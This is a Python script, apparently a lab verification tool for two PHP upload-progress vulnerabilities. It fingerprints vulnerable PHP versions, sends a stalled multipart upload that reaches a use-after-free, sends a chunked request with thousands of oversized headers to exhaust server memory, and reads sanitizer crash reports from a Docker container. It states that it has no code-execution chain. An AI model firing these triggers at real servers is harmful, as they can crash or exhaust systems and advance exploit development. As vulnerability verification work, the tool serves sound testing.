#!/usr/bin/env python3
"""
check.py — PHP2Shell (CVE-2026-109618 / CVE-2026-109619) verification tool.

Verification-only: confirms whether a PHP endpoint is reachable and whether the
session.upload_progress / OOM conditions required by the public research can be
triggered. It does NOT contain a weaponized RCE chain.

FOR AUTHORIZED LAB / RESEARCH USE ONLY. Run exclusively against systems you own
or have explicit written permission to test.

Usage:
  python3 check.py probe  --target http://127.0.0.1:18080/
  python3 check.py arm    --target http://127.0.0.1:18080/ --stall 1.5 --rounds 3
  python3 check.py arm    --target http://127.0.0.1:18081/ --docker php2shell-fpm
  python3 check.py oom    --target http://127.0.0.1:18080/
  python3 check.py uaf    --target http://127.0.0.1:18082/ --docker php2shell-asan
"""

import argparse
import json
import os
import re
import socket
import ssl
import subprocess
import sys
import time
import uuid
from urllib.parse import urlparse

BOUNDARY = "----PHP2ShellVerifyBoundary7d91"
PROGRESS_FIELD = "PHP_SESSION_UPLOAD_PROGRESS"
PROGRESS_NAME = "php2shell-verify"

BANNER = """
==============================================================
 PHP2Shell verification — CVE-2026-109618 / CVE-2026-109619
 AUTHORIZED LAB USE ONLY. Unauthorized testing is illegal.
==============================================================
"""


def die(msg, code=1):
    print(f"[!] {msg}", file=sys.stderr)
    sys.exit(code)


def parse_target(url):
    if "://" not in url:
        url = "http://" + url
    u = urlparse(url)
    if not u.hostname:
        die(f"cannot parse target: {url!r}")
    return {
        "scheme": u.scheme,
        "host": u.hostname,
        "port": u.port or (443 if u.scheme == "https" else 80),
        "path": u.path or "/",
        "url": url.rstrip("/") + (u.path if u.path else "/"),
    }


def make_ssl_context(insecure):
    ctx = ssl.create_default_context()
    if insecure:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    return ctx


def http_exchange(tgt, req_bytes, timeout=15, insecure=False):
    """Send a raw HTTP request, return (status_line, headers_dict, body_bytes)."""
    s = socket.create_connection((tgt["host"], tgt["port"]), timeout=timeout)
    try:
        if tgt["scheme"] == "https":
            ctx = make_ssl_context(insecure)
            s = ctx.wrap_socket(s, server_hostname=tgt["host"])
        s.sendall(req_bytes)
        chunks = []
        while True:
            try:
                data = s.recv(65536)
            except socket.timeout:
                break
            if not data:
                break
            chunks.append(data)
        raw = b"".join(chunks)
    finally:
        try:
            s.close()
        except Exception:
            pass

    if not raw:
        return None, {}, b""
    head, _, body = raw.partition(b"\r\n\r\n")
    lines = head.decode("latin-1", errors="replace").split("\r\n")
    status_line = lines[0] if lines else ""
    headers = {}
    for line in lines[1:]:
        if ":" in line:
            k, v = line.split(":", 1)
            headers[k.strip().lower()] = v.strip()
    return status_line, headers, body


def build_multipart(parts):
    """parts: list of (name, value_or_None, filename_or_None, content_bytes)."""
    out = bytearray()
    for name, value, filename, content in parts:
        out += f"--{BOUNDARY}\r\n".encode()
        if filename is not None:
            out += (
                f'Content-Disposition: form-data; name="{name}"; '
                f'filename="{filename}"\r\n'
            ).encode()
            out += b"Content-Type: application/octet-stream\r\n\r\n"
            out += content
        else:
            out += f'Content-Disposition: form-data; name="{name}"\r\n\r\n'.encode()
            out += value if isinstance(value, bytes) else str(value).encode()
        out += b"\r\n"
    out += f"--{BOUNDARY}--\r\n".encode()
    return bytes(out)


# ---------------------------------------------------------------------------
# probe: is the upload-progress feature reachable at all?
# ---------------------------------------------------------------------------

def cmd_probe(args):
    tgt = parse_target(args.target)
    print(f"[*] Probing {tgt['url']}")

    # 1) Baseline GET
    req = (
        f"GET {tgt['path']} HTTP/1.1\r\n"
        f"Host: {tgt['host']}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    status, headers, body = http_exchange(tgt, req, insecure=args.insecure)
    if not status:
        die("no response from target (is it up?)")
    print(f"    GET  -> {status}")
    snippet = body[:300].decode("latin-1", errors="replace").replace("\n", " | ")
    print(f"    body: {snippet}")

    php_ver = None
    m = re.search(r"version=([\d.]+)", body.decode("latin-1", errors="replace"))
    if m:
        php_ver = m.group(1)
        print(f"    [+] PHP version reported by lab endpoint: {php_ver}")
        if php_ver.startswith(("8.2.34", "8.3.35", "8.4.26", "8.5.11")) or _older_vuln(php_ver):
            print("    [+] version is in the VULNERABLE range (pre-8.2.35/8.3.36/8.4.27/8.5.12)")
        else:
            print("    [?] version looks patched or unknown — verify manually")

    # 2) Tiny multipart WITH progress field, no cookie -> expect PHPSESSID issued
    sid = uuid.uuid4().hex
    content = b"A" * 1024
    body_bytes = build_multipart([
        (PROGRESS_FIELD, PROGRESS_NAME, None, None),
        ("file", None, "probe.txt", content),
    ])
    req = (
        f"POST {tgt['path']} HTTP/1.1\r\n"
        f"Host: {tgt['host']}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
        f"Content-Length: {len(body_bytes)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body_bytes
    status, headers, resp_body = http_exchange(tgt, req, insecure=args.insecure)
    print(f"    POST(multipart+progress) -> {status}")

    set_cookies = headers.get("set-cookie", "")
    all_set = re.findall(r"PHPSESSID=([^;\s]+)", headers.get("set-cookie", ""))
    # http_exchange collapses repeated headers; also check raw pattern
    issued = bool(all_set) or "phpsessid" in set_cookies.lower()

    if issued:
        print("    [+] Set-Cookie: PHPSESSID issued by upload handler")
        print("    [+] session.upload_progress appears ENABLED (default On)")
        print("    [+] target meets config prerequisite for CVE-2026-109618/109619 chains")
        verdict = "FEATURE-ON"
    else:
        print("    [-] no PHPSESSID issued — feature likely disabled or endpoint rejects POST")
        print("    [-] (remote endpoints may hide cookies; confirm in lab mode)")
        verdict = "FEATURE-OFF-OR-UNCLEAR"

    print(f"\n[*] probe verdict: {verdict}")
    return 0 if verdict == "FEATURE-ON" else 2


def _older_vuln(ver):
    try:
        parts = [int(x) for x in ver.split(".")[:3]]
    except ValueError:
        return False
    # Everything below the fixed branches was vulnerable (5.4.0–8.5.11)
    if parts[0] < 8:
        return True
    if parts[:2] == [8, 2]:
        return parts[2] < 35
    if parts[:2] == [8, 3]:
        return parts[2] < 36
    if parts[:2] == [8, 4]:
        return parts[2] < 27
    if parts[:2] == [8, 5]:
        return parts[2] < 12
    return False


# ---------------------------------------------------------------------------
# arm: stall-window UAF arming test (verification of the stale-write path)
# ---------------------------------------------------------------------------

def cmd_arm(args):
    tgt = parse_target(args.target)
    sid = uuid.uuid4().hex
    print(f"[*] UAF arming test against {tgt['url']}")
    print(f"[*] sid={sid}  stall={args.stall}s  rounds={args.rounds}")
    print("[*] sequence: chunk1 -> stall > min_freq(1s) -> chunk2 -> complete")

    armed_rounds = 0
    for rnd in range(1, args.rounds + 1):
        result = _arm_once(tgt, sid, args.stall, args.chunk_size, args.insecure,
                           monitor_container=args.docker)
        if result:
            armed_rounds += 1
            print(f"    round {rnd}: [+] request completed 200-path, progress session active")
        else:
            print(f"    round {rnd}: [-] arming sequence failed or non-200")

        # read back session via lab endpoint (works against local lab)
        sess = _read_session_via_http(tgt, sid, args.insecure)
        if isinstance(sess, dict) and sess:
            has_progress = any(
                "bytes_processed" in k or "length" in k or "done" in k or "start_time" in k
                for k in sess.keys()
            )
            print(f"    session keys: {list(sess.keys())}")
            if has_progress:
                print("    [+] upload-progress data persisted in session — arming path REACHED")
                for k, v in sess.items():
                    if "processed" in k or "length" in k or "start" in k or "done" in k:
                        print(f"        {k} = {v}")
        time.sleep(0.3)

    # lab docker cross-check: read sess file straight out of the container
    if args.docker:
        _read_session_via_docker(args.docker, sid)

    print(f"\n[*] arming summary: {armed_rounds}/{args.rounds} rounds completed")
    if armed_rounds:
        print("[+] UAF preconditions CONFIRMED on a vulnerable build the stale-pointer")
        print("    write (session.c rfc1867 cache / OOM-stale-state path) is reachable.")
        print("    Note: reaching the arming path != code execution; patch removes the path.")
        return 0
    print("[-] arming sequence did not complete — target likely patched or filtered")
    return 2


def _arm_once(tgt, sid, stall, chunk_size, insecure, monitor_container=None):
    """Raw-socket multipart with a deliberate stall between FILE_DATA chunks."""
    filler_a = b"A" * chunk_size
    filler_b = b"B" * chunk_size
    # Full body with a placeholder split: we send headers+part1 first, stall, then part2
    part_head = (
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="{PROGRESS_FIELD}"\r\n\r\n'
        f"{PROGRESS_NAME}\r\n"
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="arm.bin"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\n"
    ).encode()
    part_tail = (
        f"\r\n--{BOUNDARY}--\r\n".encode()
    )
    total_len = len(part_head) + len(filler_a) + len(filler_b) + len(part_tail)

    headers = (
        f"POST {tgt['path']} HTTP/1.1\r\n"
        f"Host: {tgt['host']}\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
        f"Content-Length: {total_len}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()

    s = socket.create_connection((tgt["host"], tgt["port"]), timeout=20)
    try:
        if tgt["scheme"] == "https":
            ctx = make_ssl_context(insecure)
            s = ctx.wrap_socket(s, server_hostname=tgt["host"])
        s.sendall(headers + part_head + filler_a)
        # stall > min_freq; optionally snapshot the session file mid-stall
        if monitor_container:
            time.sleep(min(0.8, stall / 2))
            _read_session_via_docker(monitor_container, sid, label="mid-stall")
            time.sleep(max(0.0, stall - min(0.8, stall / 2)))
        else:
            time.sleep(stall)
        s.sendall(filler_b + part_tail)
        chunks = []
        while True:
            try:
                data = s.recv(65536)
            except socket.timeout:
                break
            if not data:
                break
            chunks.append(data)
    finally:
        try:
            s.close()
        except Exception:
            pass

    raw = b"".join(chunks)
    status_line = raw.split(b"\r\n", 1)[0].decode("latin-1", errors="replace") if raw else ""
    ok = " 200" in status_line or "200 OK" in status_line
    if not ok and status_line:
        print(f"      status: {status_line}")
    return ok


def _read_session_via_http(tgt, sid, insecure):
    req = (
        f"GET {tgt['path']} HTTP/1.1\r\n"
        f"Host: {tgt['host']}\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    status, headers, body = http_exchange(tgt, req, insecure=insecure)
    text = body.decode("latin-1", errors="replace")
    m = re.search(r"session=(\{.*\}|\[.*\])", text)
    if not m:
        return None
    try:
        return json.loads(m.group(1))
    except json.JSONDecodeError:
        return None


def _read_session_via_docker(container, sid, label=""):
    path = f"/tmp/sess_{sid}"
    try:
        out = subprocess.run(
            ["docker", "exec", container, "cat", path],
            capture_output=True, text=True, timeout=10,
        )
    except FileNotFoundError:
        print("    [!] docker CLI not found; skipping container session check")
        return
    except subprocess.TimeoutExpired:
        print("    [!] docker exec timed out")
        return
    if out.returncode != 0:
        print(f"    [-] docker: no session file {path} ({out.stderr.strip()})")
        return
    contents = out.stdout.strip()
    if not contents:
        # progress key is removed at upload completion — empty here is normal
        print(f"    [~] docker {container}:{path} exists but empty (progress key cleaned at completion)")
        return
    print(f"    [+] docker {container}:{path} {label} contents:".rstrip())
    for line in contents.splitlines():
        print(f"        {line}")


# ---------------------------------------------------------------------------
# oom: trigger-check for the OOM/longjmp arm (Chain D precondition)
# ---------------------------------------------------------------------------

def cmd_oom(args):
    tgt = parse_target(args.target)
    print(f"[*] OOM probe against {tgt['url']} (memory_limit={args.memory_limit}M on lab)")
    print("[*] strategy: chunked encoding (no Content-Length -> bypasses post_max_size)")
    print("[*]           + one part with many large headers (engine-memory amplification)")

    # No Content-Length: PHP cannot pre-check post_max_size. The rfc1867 parser
    # buffers the whole header block of a single part -> engine memory grows past
    # memory_limit while the wire payload is only moderately larger.
    header_lines = "".join(
        f"X-H{i}: " + "V" * args.header_size + "\r\n" for i in range(args.headers)
    )
    body = (
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="{PROGRESS_FIELD}"\r\n\r\n'
        f"{PROGRESS_NAME}\r\n"
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="oom.bin"\r\n'
        f"{header_lines}"
        f"Content-Type: application/octet-stream\r\n\r\n"
        f"data\r\n"
        f"--{BOUNDARY}--\r\n"
    ).encode()

    # chunked transfer-encoding
    wire = bytearray()
    for i in range(0, len(body), 65536):
        part = body[i:i + 65536]
        wire += f"{len(part):x}\r\n".encode() + part + b"\r\n"
    wire += b"0\r\n\r\n"

    req = (
        f"POST {tgt['path']} HTTP/1.1\r\n"
        f"Host: {tgt['host']}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + bytes(wire)

    print(f"    POST(chunked, ~{len(body)} bytes body, {args.headers} header lines) ...")
    status, headers, resp_body = http_exchange(tgt, req, timeout=120, insecure=args.insecure)
    print(f"    -> {status}")
    text = resp_body.decode("latin-1", errors="replace")
    if "Allowed memory size" in text or "memory size of" in text:
        print("    [+] PHP OOM fatal surfaced in response (display_errors=On)")
        m = re.search(r"(Allowed memory size[^<]*)", text)
        if m:
            print(f"        {m.group(1).strip()}")
        print("    [+] on unpatched mod_php this is the longjmp-bailout trigger path")
        print("    [+] CVE-2026-109618 precondition REACHABLE")
        return 0
    if status and "500" in status:
        print("    [~] HTTP 500 without visible fatal — may still be OOM (display_errors=Off)")
        print("    [~] inconclusive; check server logs in the lab")
        return 2
    if "exceeds the limit" in text:
        print("    [-] post_max_size rejected the body — unexpected with chunked encoding")
        return 2
    print("    [-] no OOM signal — memory_limit too high, SAPI shields it (e.g. FPM child exit), or patched")
    return 2


# ---------------------------------------------------------------------------
# uaf: run the arming sequence against an ASAN-instrumented build and read
#      the sanitizer report back out of the container. Confirms the memory
#      corruption itself (heap-use-after-free), not code execution.
# ---------------------------------------------------------------------------

def _read_asan_report(container):
    """Return the first ASAN report text found in /tmp/asan* or docker logs."""
    try:
        ls = subprocess.run(
            ["docker", "exec", container, "sh", "-c", "ls /tmp/asan* 2>/dev/null"],
            capture_output=True, text=True, timeout=10,
        )
        if ls.returncode == 0 and ls.stdout.strip():
            chunks = []
            for f in ls.stdout.split():
                cat = subprocess.run(
                    ["docker", "exec", container, "cat", f],
                    capture_output=True, text=True, timeout=10,
                )
                if cat.stdout:
                    chunks.append(cat.stdout)
            text = "\n".join(chunks)
            if "AddressSanitizer" in text or "heap-use-after-free" in text:
                return text
        logs = subprocess.run(
            ["docker", "logs", "--tail", "200", container],
            capture_output=True, text=True, timeout=10,
        )
        text = logs.stdout + logs.stderr
        if "AddressSanitizer" in text or "heap-use-after-free" in text:
            return text
    except FileNotFoundError:
        print("    [!] docker CLI not found; cannot read ASAN logs")
    except subprocess.TimeoutExpired:
        print("    [!] docker exec/logs timed out")
    except OSError as e:
        print(f"    [!] docker log read failed: {e}")
    return None


def _clear_asan_logs(container):
    try:
        subprocess.run(
            ["docker", "exec", container, "sh", "-c", "rm -f /tmp/asan.*"],
            capture_output=True, timeout=10,
        )
    except (OSError, subprocess.TimeoutExpired):
        pass


def cmd_uaf(args):
    tgt = parse_target(args.target)
    if not args.docker:
        die("uaf requires --docker <container> so the ASAN log can be read")

    print(f"[*] UAF confirmation against ASAN build at {tgt['url']}")
    print(f"[*] container={args.docker}  stall={args.stall}s  rounds={args.rounds}")
    print("[*] arming sequence identical to `arm`; ASAN catches the stale write")
    _clear_asan_logs(args.docker)

    sid = uuid.uuid4().hex
    for rnd in range(1, args.rounds + 1):
        _arm_once(tgt, sid, args.stall, args.chunk_size, args.insecure)
        report = _read_asan_report(args.docker)
        if report:
            print(f"    round {rnd}: [+] ASAN report captured")
            for line in report.splitlines()[:50]:
                print(f"        {line}")
            print(f"\n[+] heap-use-after-free CONFIRMED by AddressSanitizer (round {rnd})")
            print("    This is the memory corruption itself. Not code execution.")
            print("    Frames in session.c / var_unserializer map to the rfc1867 stale-pointer write.")
            return 0
        print(f"    round {rnd}: [-] no ASAN report yet")
        time.sleep(0.3)

    print("\n[-] no ASAN report. Confirm:")
    print("    container built with -fsanitize=address; USE_ZEND_ALLOC=0;")
    print("    first chunk >= 64KiB; php2shell-asan is the target, not php:8.2.34-apache")
    return 2


# ---------------------------------------------------------------------------

def main():
    print(BANNER)
    ap = argparse.ArgumentParser(description="PHP2Shell verification (lab/authorized use only)")
    ap.add_argument("--insecure", action="store_true", help="skip TLS verification")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p = sub.add_parser("probe", help="check upload-progress feature reachability")
    p.add_argument("--target", default="http://127.0.0.1:18080/")
    p.set_defaults(func=cmd_probe)

    a = sub.add_parser("arm", help="stall-window UAF arming verification")
    a.add_argument("--target", default="http://127.0.0.1:18080/")
    a.add_argument("--stall", type=float, default=1.5, help="stall seconds (must be > min_freq)")
    a.add_argument("--rounds", type=int, default=3)
    a.add_argument("--chunk-size", type=int, default=65536, dest="chunk_size",
                   help="bytes sent before the stall (need enough for the rfc1867 "
                        "handler to flush progress; 64KiB works reliably)")
    a.add_argument("--docker", help="container name to cat /tmp/sess_<sid> from (lab only)")
    a.set_defaults(func=cmd_arm)

    o = sub.add_parser("oom", help="OOM/longjmp precondition probe (Chain D)")
    o.add_argument("--target", default="http://127.0.0.1:18080/")
    o.add_argument("--headers", type=int, default=10000,
                   help="header lines in the single oversized part (default 10000)")
    o.add_argument("--header-size", type=int, default=4000, dest="header_size",
                   help="bytes per header value (default 4000)")
    o.add_argument("--memory-limit", type=int, default=32, dest="memory_limit")
    o.set_defaults(func=cmd_oom)

    u = sub.add_parser("uaf", help="ASAN-confirmed heap-use-after-free (lab ASAN image)")
    u.add_argument("--target", default="http://127.0.0.1:18082/")
    u.add_argument("--stall", type=float, default=1.5)
    u.add_argument("--rounds", type=int, default=3)
    u.add_argument("--chunk-size", type=int, default=65536, dest="chunk_size")
    u.add_argument("--docker", default="php2shell-asan",
                   help="ASAN container name (default php2shell-asan)")
    u.set_defaults(func=cmd_uaf)

    args = ap.parse_args()
    sys.exit(args.func(args))


if __name__ == "__main__":
    main()
